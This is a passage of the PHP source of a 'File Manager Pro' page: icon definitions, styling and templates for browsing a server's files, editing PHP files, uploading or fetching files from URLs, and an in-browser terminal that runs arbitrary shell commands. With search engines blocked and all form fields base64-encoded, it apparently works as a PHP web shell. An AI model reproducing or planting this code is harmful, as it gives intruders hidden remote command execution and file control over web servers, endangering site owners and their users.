        'rename'   => '<path d="M4 20h16"/><path d="M14 3l-8 9h6l-2 8 8-9h-6z"/>',
        'copy'     => '<rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>',
        'move'     => '<path d="M5 9l-3 3 3 3"/><path d="M9 5l3-3 3 3"/><path d="M15 19l-3 3-3-3"/><path d="M19 9l3 3-3 3"/><path d="M2 12h20"/><path d="M12 2v20"/>',
        'chmod'    => '<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 1 1-2.83 2.83l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 1 1-4 0v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 1 1-2.83-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 1 1 0-4h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 1 1 2.83-2.83l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 1 1 4 0v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 1 1 2.83 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 1 1 0 4h-.09a1.65 1.65 0 0 0-1.51 1z"/>',
        'trash'    => '<path d="M3 6h18"/><path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6M14 11v6"/>',
        'zip'      => '<rect x="3" y="4" width="18" height="5" rx="1"/><path d="M5 9v11a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1V9"/><path d="M10 13h4"/><path d="M12 13v3"/>',
        'up'       => '<path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><path d="M17 8l-5-5-5 5"/><path d="M12 3v12"/>',
        'search'   => '<circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>',
        'folder-plus' => '<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M12 11v6M9 14h6"/>',
        'file-plus'   => '<path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><path d="M14 2v6h6"/><path d="M12 12v6M9 15h6"/>',
        'arrow-up'    => '<path d="M12 19V5"/><path d="M5 12l7-7 7 7"/>',
        'goto'        => '<path d="M5 12h14"/><path d="M13 6l6 6-6 6"/>',
        'back'        => '<path d="M19 12H5"/><path d="M11 18l-6-6 6-6"/>',
        'terminal'    => '<path d="M4 17l6-5-6-5"/><path d="M12 19h8"/>',
        'globe'       => '<circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/>',
        'check'       => '<path d="M20 6L9 17l-5-5"/>',
        'x'           => '<path d="M18 6L6 18"/><path d="M6 6l12 12"/>',
    );
    return fm_svg($bodies[$name], $size);
}

/** Print a hidden base64-encoded POST field (named "<name>_b64" to match fm_post). */
function fm_hid($name, $value) {
    echo '<input type="hidden" name="' . fm_h($name) . '_b64" value="' . fm_h(fm_b64e($value)) . '">' . "\n";
}

/** Print the CSRF hidden field. */
function fm_csrf_field() {
    echo '<input type="hidden" name="csrf" value="' . fm_h($GLOBALS['CSRF']) . '">' . "\n";
}

$EDIT_EXTS = array('php','phtml','php3','php4','php5','phps','txt','md','html','htm','css','js','json','xml','py','rb','java','c','cpp','h','sh','sql','yml','yaml','ini','conf','cfg','htaccess','csv','log','env','ts','vue','go','rs','pl','lua');
$IMAGE_EXTS = array('png','jpg','jpeg','gif','webp','bmp','svg','ico');

@header('Content-Type: text/html; charset=utf-8');
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>File Manager Pro — <?php echo fm_h(fm_base($cur)); ?></title>
<style>
:root{--bg:#0b1120;--surface:#111a2e;--surface2:#1c2942;--border:#263553;--border2:#33456b;--text:#e6edf7;--text2:#8ea0bf;--accent:#6366f1;--accent2:#818cf8;--violet:#8b5cf6;--green:#34d399;--red:#f87171;--amber:#fbbf24;--cyan:#22d3ee}
*{box-sizing:border-box;margin:0;padding:0}
html{scrollbar-color:var(--border2) var(--bg)}
body{background:var(--bg);color:var(--text);font:14px/1.6 system-ui,-apple-system,"Segoe UI",sans-serif;min-height:100vh}
::selection{background:rgba(99,102,241,.4)}
a{color:var(--accent2);text-decoration:none}
a:hover{text-decoration:underline}
svg{vertical-align:middle;flex-shrink:0}

/* ---------- header ---------- */
.topbar{position:sticky;top:0;z-index:50;display:flex;align-items:center;gap:14px;padding:12px 22px;background:rgba(11,17,32,.9);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);flex-wrap:nowrap;min-width:0}
.brand{display:flex;align-items:center;gap:10px;font-size:15.5px;font-weight:700;letter-spacing:.01em}
.brand .mark{width:34px;height:34px;border-radius:10px;background:linear-gradient(135deg,var(--accent),var(--violet));display:flex;align-items:center;justify-content:center;color:#fff;box-shadow:0 4px 14px rgba(99,102,241,.35)}
.pathbar{margin-left:auto;display:flex;align-items:center;gap:10px;font-size:12px;color:var(--text2);min-width:0;flex-shrink:1}
.pathbar code{font-family:"SF Mono",SFMono-Regular,Consolas,"Liberation Mono",monospace;color:var(--cyan);background:var(--surface);border:1px solid var(--border);padding:3px 10px;border-radius:7px;max-width:46vw;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.badge{font-size:10.5px;font-weight:600;padding:3px 9px;border-radius:20px;background:rgba(99,102,241,.15);color:var(--accent2);border:1px solid rgba(99,102,241,.3);white-space:nowrap}

/* ---------- layout ---------- */
.wrap{max-width:1280px;margin:0 auto;padding:20px 22px 60px}
.crumbs{display:flex;align-items:center;gap:5px;padding:4px 0 16px;font-size:13px;color:var(--text2);flex-wrap:wrap}
.crumbs a{color:var(--text2);padding:3px 8px;border-radius:7px;font-weight:500}
.crumbs a:hover{background:var(--surface2);color:var(--accent2);text-decoration:none}
.crumbs .sep{color:var(--border2);font-size:11px}
.crumbs .cur{color:var(--text);font-weight:600;padding:3px 8px}

/* ---------- toolbar ---------- */
.toolbar{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:12px;margin-bottom:18px}
.tool{background:var(--surface);border:1px solid var(--border);border-radius:14px;padding:12px 14px;display:flex;gap:8px;align-items:center;flex-wrap:wrap}
.tool .t-label{width:100%;font-size:10.5px;font-weight:700;color:var(--text2);text-transform:uppercase;letter-spacing:.08em;margin-bottom:2px;display:flex;align-items:center;gap:6px}
.tool input[type=text],.tool input[type=file]{background:var(--bg);border:1px solid var(--border2);color:var(--text);padding:8px 11px;border-radius:9px;font-size:13px;font-family:inherit;min-width:0}
.tool input[type=text]{flex:1;width:100%}
.tool input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 0 3px rgba(99,102,241,.18)}
.btn{display:inline-flex;align-items:center;gap:6px;border:none;padding:8px 15px;border-radius:9px;font-size:12.5px;font-weight:600;cursor:pointer;font-family:inherit;white-space:nowrap;text-decoration:none;transition:all .15s}
.btn:hover{text-decoration:none}
.btn-primary{background:linear-gradient(135deg,var(--accent),var(--violet));color:#fff;box-shadow:0 3px 10px rgba(99,102,241,.3)}
.btn-primary:hover{filter:brightness(1.15)}
.btn-ghost{background:var(--surface2);color:var(--text);border:1px solid var(--border2)}
.btn-ghost:hover{background:var(--border);color:#fff}

/* ---------- messages ---------- */
.msg{display:flex;align-items:center;gap:9px;padding:11px 16px;border-radius:11px;margin-bottom:16px;font-size:13px;font-weight:500}
.msg.ok{background:rgba(52,211,153,.09);color:var(--green);border:1px solid rgba(52,211,153,.25)}
.msg.err{background:rgba(248,113,113,.09);color:var(--red);border:1px solid rgba(248,113,113,.25)}

/* ---------- listing ---------- */
.card{background:var(--surface);border:1px solid var(--border);border-radius:16px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.25)}
.card-head{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid var(--border);flex-wrap:wrap}
.card-head .diricon{color:var(--amber)}
.card-head h3{font-size:13px;font-family:"SF Mono",SFMono-Regular,Consolas,monospace;color:var(--text);word-break:break-all;font-weight:600}
.card-head .count{margin-left:auto;font-size:11.5px;color:var(--text2);background:var(--surface2);padding:3px 11px;border-radius:20px;white-space:nowrap;border:1px solid var(--border)}
.tbl-scroll{overflow-x:auto}
table{width:100%;border-collapse:collapse;min-width:820px}
th{padding:9px 18px;text-align:left;font-size:10.5px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--text2);background:var(--surface);border-bottom:1px solid var(--border)}
td{padding:8px 18px;border-bottom:1px solid var(--border);font-size:13px;vertical-align:middle}
tbody tr:last-child td{border-bottom:none}
tbody tr{transition:background .12s}
tbody tr:hover td{background:var(--surface2)}
.nm{display:flex;align-items:center;gap:11px;min-width:220px}
.nm .ic{width:34px;height:34px;border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
.ic.dir{color:var(--amber);background:rgba(251,191,36,.1)}
.ic.file{color:var(--text2);background:rgba(148,163,184,.09)}
.ic.link{color:var(--green);background:rgba(52,211,153,.1)}
.ic.image{color:var(--cyan);background:rgba(34,211,238,.1)}
.ic.code{color:var(--accent2);background:rgba(129,140,248,.12)}
.ic.archive{color:var(--violet);background:rgba(139,92,246,.12)}
.ic.doc{color:var(--green);background:rgba(52,211,153,.1)}
.ic.audio{color:#f472b6;background:rgba(244,114,182,.1)}
.ic.video{color:#fb923c;background:rgba(251,146,60,.1)}
.ic.font{color:#a3e635;background:rgba(163,230,53,.1)}
.nm .name{font-weight:500;word-break:break-all}
.nm .name a{color:var(--text)}
.nm .name a:hover{color:var(--accent2);text-decoration:none}
.sz{text-align:right;color:var(--text2);font-variant-numeric:tabular-nums;font-size:12px;white-space:nowrap}
.dt{color:var(--text2);font-size:12px;white-space:nowrap}
.pr{font-family:"SF Mono",SFMono-Regular,Consolas,monospace;font-size:11.5px;color:var(--text2);background:var(--bg);border:1px solid var(--border);padding:2px 7px;border-radius:6px;white-space:nowrap}
.act{text-align:right;white-space:nowrap}
.act form{display:inline;margin:0}
.iconbtn{display:inline-flex;align-items:center;justify-content:center;gap:4px;padding:5px 8px;border:1px solid var(--border2);border-radius:8px;background:transparent;color:var(--text2);cursor:pointer;margin-left:4px;transition:all .15s;vertical-align:middle;font-family:inherit;font-size:11px}
.iconbtn:hover{background:var(--surface2);color:var(--text);border-color:var(--accent)}
.iconbtn.danger{color:var(--red);border-color:rgba(248,113,113,.35)}
.iconbtn.danger:hover{background:rgba(248,113,113,.1);border-color:var(--red);color:var(--red)}
.mini{width:74px;padding:4px 7px;font-size:11px;border-radius:6px;background:var(--bg);border:1px solid var(--border2);color:var(--text);font-family:inherit}
.mini.narrow{width:52px}
.empty{padding:64px 20px;text-align:center;color:var(--text2)}
.empty svg{opacity:.3;margin-bottom:10px}
.empty p{font-size:13.5px}

/* ---------- editor / preview ---------- */
.editor-card{margin-bottom:20px}
.ed-head{display:flex;align-items:center;gap:12px;padding:14px 18px;border-bottom:1px solid var(--border);flex-wrap:wrap}
.ed-head .fp{font-family:"SF Mono",SFMono-Regular,Consolas,monospace;font-size:12.5px;color:var(--cyan);word-break:break-all}
.ed-head .meta{margin-left:auto;font-size:11.5px;color:var(--text2);display:flex;gap:8px;align-items:center}
textarea.ed{width:100%;min-height:62vh;background:var(--bg);color:var(--text);border:none;padding:18px 20px;font:13px/1.65 "SF Mono",SFMono-Regular,Consolas,"Liberation Mono",monospace;resize:vertical;tab-size:4}
textarea.ed:focus{outline:none}
.ed-foot{display:flex;justify-content:flex-end;gap:8px;padding:13px 18px;border-top:1px solid var(--border);flex-wrap:wrap}
.preview-body{padding:22px;display:flex;justify-content:center;background:var(--bg)}
.preview-body img{max-width:100%;border-radius:10px;border:1px solid var(--border)}

/* ---------- terminal ---------- */
.term{background:#04070f;border-bottom:1px solid var(--border);padding:16px 18px;font:12.5px/1.65 "SF Mono",SFMono-Regular,Consolas,"Liberation Mono",monospace;min-height:220px;max-height:58vh;overflow:auto;white-space:pre-wrap;word-break:break-word;color:#7ee2a8}
.term-in{display:flex;gap:10px;align-items:center;padding:13px 16px;background:var(--surface)}
.term-in .pr{font-family:"SF Mono",SFMono-Regular,Consolas,monospace;font-weight:700;color:var(--green);white-space:nowrap;font-size:13px}
.term-in input{flex:1;min-width:0;background:var(--bg);border:1px solid var(--border2);color:var(--text);padding:9px 12px;border-radius:9px;font:13px "SF Mono",SFMono-Regular,Consolas,monospace}
.term-in input:focus{outline:none;border-color:var(--green);box-shadow:0 0 0 3px rgba(52,211,153,.15)}

/* ---------- search ---------- */
.search-note{padding:12px 18px;border-bottom:1px solid var(--border);font-size:12.5px;color:var(--text2)}
.search-note b{color:var(--text)}

/* ---------- footer ---------- */
.foot{padding:20px;text-align:center;font-size:11.5px;color:var(--text2);border-top:1px solid var(--border);margin-top:44px}
.foot code{color:var(--text2);background:var(--surface);padding:2px 8px;border-radius:6px;border:1px solid var(--border)}

@media(max-width:860px){
  .wrap{padding:14px 12px 50px}
  .pathbar code{max-width:60vw}
  th,td{padding:7px 12px}
  .iconbtn{padding:5px 6px}
  .iconbtn .bl{display:none}
  .mini{width:64px}
}
</style>
</head>
<body>
<div class="topbar">
  <div class="brand">
    <span class="mark"><?php echo fm_svg('<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>', 18); ?></span>
    File Manager <span style="color:var(--accent2)">Pro</span>
  </div>
  <div class="pathbar">
    <code title="<?php echo fm_h($cur); ?>"><?php echo fm_h($cur); ?></code>
    <span class="badge">PHP <?php echo fm_h(PHP_VERSION); ?></span>
    <span class="badge"><?php echo fm_h(PHP_OS); ?></span>
  </div>
</div>

<div class="wrap">

<?php if ($msg !== '') { ?>
  <div class="msg ok"><?php echo fm_ai('check', 15); ?> <?php echo fm_h($msg); ?></div>
<?php } ?>
<?php if ($err !== '') { ?>
  <div class="msg err"><?php echo fm_ai('x', 15); ?> <?php echo fm_h($err); ?></div>
<?php } ?>

<?php if ($editFile === null && $viewFile === null && !$termOn) { ?>
<div class="crumbs">
  <?php
  $crumbs = array();
  $path = $cur;
  if (preg_match('#^[a-zA-Z]:#', $path)) {
      $drive = substr($path, 0, 2);
      $crumbs[] = array('label' => $drive . '/', 'path' => $drive . '/');
      $rest = ltrim(substr($path, 2), '/');
      $acc = $drive;
      if ($rest !== '') { foreach (explode('/', $rest) as $part) { if ($part === '') continue; $acc .= '/' . $part; $crumbs[] = array('label' => $part, 'path' => $acc); } }
  } else {
      $crumbs[] = array('label' => '/', 'path' => '/');
      $rest = ltrim($path, '/');
      if ($rest !== '') { $acc = ''; foreach (explode('/', $rest) as $part) { if ($part === '') continue; $acc .= '/' . $part; $crumbs[] = array('label' => $part, 'path' => $acc); } }
  }
  $last = count($crumbs) - 1;
  foreach ($crumbs as $i => $c) {
      if ($i > 0) echo '<span class="sep">/</span>';
      if ($i === $last) { echo '<span class="cur">' . fm_h($c['label']) . '</span>'; }
      else { echo '<a href="?d=' . fm_enc($c['path']) . '">' . fm_h($c['label']) . '</a>'; }
  }
  ?>
</div>

<div class="toolbar">
  <?php if ($hasParent) { ?>
  <form method="get" class="tool" action="">
    <span class="t-label">Navigate</span>
    <input type="hidden" name="d" value="<?php echo fm_h(fm_enc($parent)); ?>">
    <button type="submit" class="btn btn-ghost" style="width:100%;justify-content:center"><?php echo fm_ai('arrow-up', 14); ?> Up to <?php echo fm_h(fm_base($parent)); ?></button>
  </form>
  <?php } ?>

  <form method="get" class="tool" action="">
    <span class="t-label"><?php echo fm_ai('terminal', 13); ?> Terminal</span>
    <input type="hidden" name="a" value="term">
    <input type="hidden" name="d" value="<?php echo fm_h($curEnc); ?>">
    <button type="submit" class="btn btn-ghost" style="width:100%;justify-content:center"><?php echo fm_ai('terminal', 14); ?> Open terminal here</button>
  </form>

  <form method="post" enctype="multipart/form-data" class="tool" action="">
    <span class="t-label"><?php echo fm_ai('up', 13); ?> Upload files</span>
    <?php fm_csrf_field(); ?>
    <input type="hidden" name="a" value="upload">
    <?php fm_hid('dir', $cur); ?>
    <input type="file" name="up[]" multiple style="flex:1;min-width:0">
    <button type="submit" class="btn btn-primary"><?php echo fm_ai('up', 14); ?> Upload</button>
  </form>

  <form method="post" class="tool" action="" onsubmit="return fmEncField(this,['url','name'])">
    <span class="t-label"><?php echo fm_ai('globe', 13); ?> Upload from URL</span>
    <?php fm_csrf_field(); ?>
    <input type="hidden" name="a" value="fetch">
    <?php fm_hid('dir', $cur); ?>
    <input type="text" name="url" placeholder="https://example.com/file.zip" required>
    <input type="text" name="name" placeholder="save as (optional)" style="max-width:150px">
    <button type="submit" class="btn btn-primary"><?php echo fm_ai('globe', 14); ?> Fetch</button>
  </form>

  <form method="post" class="tool" action="" onsubmit="return fmEncField(this,'name')">
    <span class="t-label"><?php echo fm_ai('file-plus', 13); ?> New file</span>
    <?php fm_csrf_field(); ?>
    <input type="hidden" name="a" value="newfile">
    <?php fm_hid('dir', $cur); ?>
    <input type="text" name="name" placeholder="new-file.php" required>
    <button type="submit" class="btn btn-ghost">Create</button>
  </form>

  <form method="post" class="tool" action="" onsubmit="return fmEncField(this,'name')">
    <span class="t-label"><?php echo fm_ai('folder-plus', 13); ?> New folder</span>
    <?php fm_csrf_field(); ?>
    <input type="hidden" name="a" value="mkdir">
    <?php fm_hid('dir', $cur); ?>
    <input type="text" name="name" placeholder="new-folder" required>
    <button type="submit" class="btn btn-ghost">Create</button>
  </form>

  <form method="post" class="tool" action="" onsubmit="return fmEncField(this,'dest')">
    <span class="t-label"><?php echo fm_ai('goto', 13); ?> Go to path</span>
    <?php fm_csrf_field(); ?>
    <input type="hidden" name="a" value="goto">
    <input type="text" name="dest" placeholder="/home/user/public_html" required>
    <button type="submit" class="btn btn-ghost">Go</button>
  </form>

  <form method="get" class="tool" action="">
    <span class="t-label"><?php echo fm_ai('search', 13); ?> Search here</span>
    <input type="hidden" name="d" value="<?php echo fm_h($curEnc); ?>">
    <input type="text" name="q" placeholder="filename…" value="<?php echo fm_h($searchQ); ?>" style="flex:1">
    <button type="submit" class="btn btn-ghost"><?php echo fm_ai('search', 14); ?> Search</button>
  </form>
</div>
<?php } ?>

<?php /* ===================== EDITOR ===================== */ ?>
<?php if ($editFile !== null) {
    $sz = fm_size_int($editFile);
    $ext = fm_ext(fm_base($editFile));
    $isText = ($sz <= 8 * 1048576) && ($sz >= 0);
?>
  <div class="card editor-card">
    <div class="ed-head">
      <?php echo fm_icon('file', $ext, 18); ?>
      <span class="fp"><?php echo fm_h($editFile); ?></span>
      <span class="meta">
        <span class="badge"><?php echo fm_h(fm_size_str($editFile)); ?></span>
        <span class="badge"><?php echo fm_h(fm_perm_str($editFile)); ?></span>
        <a class="btn btn-ghost" href="?d=<?php echo fm_h($curEnc); ?>"><?php echo fm_ai('back', 14); ?> Back</a>
      </span>
    </div>
    <?php if (!$isText) { ?>
      <div class="empty"><p>This file is too large to edit in the browser (limit 8 MB). Use download instead.</p></div>
    <?php } else { ?>
    <form method="post" action="" onsubmit="return fmPrepSave(this)">
      <?php fm_csrf_field(); ?>
      <input type="hidden" name="a" value="save">
      <?php fm_hid('dir', $cur); ?>
      <?php fm_hid('file', $editFile); ?>
      <input type="hidden" name="content_b64" value="">
      <textarea class="ed" name="content" spellcheck="false"><?php echo fm_h(@file_get_contents($editFile)); ?></textarea>
      <div class="ed-foot">
        <a class="btn btn-ghost" href="?d=<?php echo fm_h($curEnc); ?>">Cancel</a>
        <a class="btn btn-ghost" href="?a=dl&amp;f=<?php echo fm_h(fm_enc($editFile)); ?>"><?php echo fm_ai('download', 14); ?> Download</a>
        <button type="submit" class="btn btn-primary"><?php echo fm_ai('check', 14); ?> Save changes</button>
      </div>
    </form>
    <?php } ?>
  </div>

<?php /* ===================== IMAGE PREVIEW ===================== */ ?>
<?php } elseif ($viewFile !== null) {
    $ext = fm_ext(fm_base($viewFile));
?>
  <div class="card editor-card">
    <div class="ed-head">
      <?php echo fm_icon('file', $ext, 18); ?>
      <span class="fp"><?php echo fm_h($viewFile); ?></span>
      <span class="meta">
        <span class="badge"><?php echo fm_h(fm_size_str($viewFile)); ?></span>
        <a class="btn btn-ghost" href="?d=<?php echo fm_h($curEnc); ?>"><?php echo fm_ai('back', 14); ?> Back</a>
      </span>
    </div>
    <div class="preview-body">
      <img src="?a=view&amp;f=<?php echo fm_h(fm_enc($viewFile)); ?>" alt="<?php echo fm_h(fm_base($viewFile)); ?>">
    </div>
    <div class="ed-foot">
      <a class="btn btn-ghost" href="?a=dl&amp;f=<?php echo fm_h(fm_enc($viewFile)); ?>"><?php echo fm_ai('download', 14); ?> Download</a>
      <?php if (in_array($ext, $EDIT_EXTS, true)) { ?>
        <a class="btn btn-primary" href="?a=edit&amp;f=<?php echo fm_h(fm_enc($viewFile)); ?>&amp;d=<?php echo fm_h($curEnc); ?>"><?php echo fm_ai('edit', 14); ?> Edit</a>
      <?php } ?>
    </div>
  </div>

<?php /* ===================== TERMINAL ===================== */ ?>
<?php } elseif ($termOn) {
    $canExec = function_exists('proc_open') || function_exists('shell_exec') || function_exists('exec') || function_exists('passthru');
?>
  <div class="card editor-card">
    <div class="ed-head">
      <?php echo fm_ai('terminal', 18); ?>
      <span class="fp"><?php echo fm_h($termUser . '@' . $termHost . ' : ' . $cur); ?></span>
      <span class="meta">
        <form method="post" action="" style="display:inline" onsubmit="return confirm('Clear terminal history?')">
          <?php fm_csrf_field(); ?>
          <input type="hidden" name="a" value="tclear">
          <?php fm_hid('dir', $cur); ?>
          <button type="submit" class="btn btn-ghost">Clear</button>
        </form>
        <a class="btn btn-ghost" href="?d=<?php echo fm_h($curEnc); ?>"><?php echo fm_ai('back', 14); ?> Back</a>
      </span>
    </div>
    <?php if (!$canExec) { ?>
      <div class="empty">
        <?php echo fm_ai('terminal', 40); ?>
        <p>Command execution is not available on this server<br>(shell_exec, proc_open, exec and passthru are all disabled).</p>
      </div>
    <?php } else { ?>
    <div class="term" id="termOut"><?php echo fm_h($termOut); ?></div>
    <form method="post" action="" class="term-in" onsubmit="return fmEncField(this,'cmd')">
      <?php fm_csrf_field(); ?>
      <input type="hidden" name="a" value="terminal">
      <?php fm_hid('dir', $cur); ?>
      <span class="pr"><?php echo fm_h($termUser) . ' $'; ?></span>
      <input type="text" name="cmd" id="termIn" placeholder="type a command and press Enter…" autocomplete="off" autocapitalize="off" spellcheck="false" autofocus>
      <button type="submit" class="btn btn-primary"><?php echo fm_ai('terminal', 14); ?> Run</button>
    </form>
    <?php } ?>
  </div>

<?php /* ===================== SEARCH RESULTS ===================== */ ?>
<?php } elseif ($searchResults !== null) { ?>
  <div class="card">
    <div class="card-head">
      <?php echo fm_ai('search', 18); ?>
      <h3>Search: "<?php echo fm_h($searchQ); ?>"</h3>
      <span class="count"><?php echo count($searchResults); ?> match(es)</span>
    </div>
    <?php if (count($searchResults) === 0) { ?>
      <div class="empty"><p>No matches found.</p></div>
    <?php } else { ?>
    <div class="tbl-scroll"><table>
      <thead><tr><th>Name</th><th>Location</th><th style="text-align:right">Actions</th></tr></thead>
      <tbody>
      <?php foreach ($searchResults as $r) {
          $rp = $r['path'];
          $rd = fm_n(dirname($rp));
          $enc = fm_enc($rp);
      ?>
        <tr>
          <td><div class="nm"><span class="ic <?php echo $r['dir'] ? 'dir' : 'file'; ?>"><?php echo fm_icon($r['dir'] ? 'dir' : 'file', fm_ext($r['name']), 17); ?></span><span class="name"><?php echo fm_h($r['name']); ?></span></div></td>
          <td class="dt"><code style="font-family:monospace;font-size:11.5px;color:var(--text2)"><?php echo fm_h($rd); ?></code></td>
          <td class="act">
            <a class="iconbtn" href="?d=<?php echo fm_h(fm_enc($rd)); ?>"><?php echo fm_ai('goto', 13); ?> <span class="bl">open folder</span></a>
            <?php if (!$r['dir']) { ?>
              <a class="iconbtn" href="?a=dl&amp;f=<?php echo fm_h($enc); ?>"><?php echo fm_ai('download', 13); ?> <span class="bl">dl</span></a>
            <?php } ?>
          </td>
        </tr>
      <?php } ?>
      </tbody>
    </table></div>
    <?php } ?>
  </div>

<?php /* ===================== LISTING ===================== */ ?>
<?php } else { ?>
  <?php
  $items = fm_ls($cur);
  $dirs = array(); $fils = array(); $links = array();
  if (is_array($items)) {
      foreach ($items as $it) {
          if (!is_string($it) || $it === '' || $it === '.' || $it === '..') continue;
          $full = $cur . '/' . $it;
          $k = fm_kind($full);
          if ($k === 'dir') $dirs[] = $it;
          elseif ($k === 'link') $links[] = $it;
          else $fils[] = $it;
      }
  }
  @natcasesort($dirs); @natcasesort($links); @natcasesort($fils);
  $list = array_merge($dirs, $links, $fils);
  $total = count($list);
  ?>
  <div class="card">
    <div class="card-head">
      <span class="diricon"><?php echo fm_icon('dir', '', 20); ?></span>
      <h3><?php echo fm_h($cur); ?></h3>
      <span class="count"><?php echo (int)$total; ?> item(s) · <?php echo count($dirs); ?> folders · <?php echo (count($fils) + count($links)); ?> files</span>
    </div>

    <?php if ($total === 0) { ?>
      <div class="empty">
        <?php echo fm_svg('<path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/>', 44); ?>
        <p>This directory is empty</p>
      </div>
    <?php } else { ?>
    <div class="tbl-scroll"><table>
      <thead>
        <tr>
          <th>Name</th>
          <th style="text-align:right">Size</th>
          <th>Modified</th>
          <th>Perms</th>
          <th style="text-align:right">Actions</th>
        </tr>
      </thead>
      <tbody>
      <?php foreach ($list as $it) {
          $full = $cur . '/' . $it;
          $perm = fm_perm_str($full);
          $kind = fm_kind($full);
          $isDir = ($kind === 'dir');
          $ext = $isDir ? '' : fm_ext($it);
          $mt = @filemtime($full);
          $mtStr = ($mt !== false) ? date('Y-m-d H:i', $mt) : '—';
          $enc = fm_enc($full);

          if ($isDir) {
              $nameLink = '<a href="?d=' . $enc . '">' . fm_h($it) . '</a>';
          } elseif (in_array($ext, $EDIT_EXTS, true)) {
              $nameLink = '<a href="?a=edit&amp;f=' . $enc . '&amp;d=' . $curEnc . '">' . fm_h($it) . '</a>';
          } elseif (in_array($ext, $IMAGE_EXTS, true)) {
              $nameLink = '<a href="?a=preview&amp;f=' . $enc . '&amp;d=' . $curEnc . '">' . fm_h($it) . '</a>';
          } else {
              $nameLink = '<a href="?a=dl&amp;f=' . $enc . '">' . fm_h($it) . '</a>';
          }
      ?>
        <tr>
          <td>
            <div class="nm">
              <?php $icClass = fm_icon_type($kind, $ext); ?>
              <span class="ic <?php echo $icClass; ?>"><?php echo fm_icon($kind, $ext, 17); ?></span>
              <span class="name"><?php echo $nameLink; ?></span>
            </div>
          </td>
          <td class="sz"><?php echo $isDir ? '—' : fm_h(fm_size_str($full)); ?></td>
          <td class="dt"><?php echo fm_h($mtStr); ?></td>
          <td><span class="pr"><?php echo fm_h($perm); ?></span></td>
          <td class="act">
            <?php if (!$isDir && in_array($ext, $EDIT_EXTS, true)) { ?>
              <a class="iconbtn" title="Edit" href="?a=edit&amp;f=<?php echo $enc; ?>&amp;d=<?php echo $curEnc; ?>"><?php echo fm_ai('edit', 13); ?> <span class="bl">edit</span></a>
            <?php } ?>
            <?php if (!$isDir && in_array($ext, $IMAGE_EXTS, true)) { ?>
              <a class="iconbtn" title="Preview" href="?a=preview&amp;f=<?php echo $enc; ?>&amp;d=<?php echo $curEnc; ?>"><?php echo fm_ai('view', 13); ?> <span class="bl">view</span></a>
            <?php } ?>
            <?php if (!$isDir) { ?>
              <a class="iconbtn" title="Download" href="?a=dl&amp;f=<?php echo $enc; ?>"><?php echo fm_ai('download', 13); ?> <span class="bl">dl</span></a>
            <?php } ?>
            <?php if ($isDir) { ?>
              <form method="post" action="" style="display:inline" onsubmit="return confirm('Create zip archive of ' + <?php echo json_encode($it); ?> + '?')">
                <?php fm_csrf_field(); ?>
                <input type="hidden" name="a" value="zip">
                <?php fm_hid('dir', $cur); ?>
                <?php fm_hid('file', $full); ?>
                <button type="submit" class="iconbtn" title="Zip folder"><?php echo fm_ai('zip', 13); ?> <span class="bl">zip</span></button>
              </form>
            <?php } ?>
            <form method="post" action="" style="display:inline" onsubmit="return fmDoTransfer(this,'copy')">
              <?php fm_csrf_field(); ?>
              <input type="hidden" name="a" value="copy">
              <?php fm_hid('dir', $cur); ?>
              <?php fm_hid('file', $full); ?>
              <button type="submit" class="iconbtn" title="Copy to…"><?php echo fm_ai('copy', 13); ?> <span class="bl">copy</span></button>
            </form>
            <form method="post" action="" style="display:inline" onsubmit="return fmDoTransfer(this,'move')">
              <?php fm_csrf_field(); ?>
              <input type="hidden" name="a" value="move">
              <?php fm_hid('dir', $cur); ?>
              <?php fm_hid('file', $full); ?>
              <button type="submit" class="iconbtn" title="Move to…"><?php echo fm_ai('move', 13); ?> <span class="bl">move</span></button>
            </form>
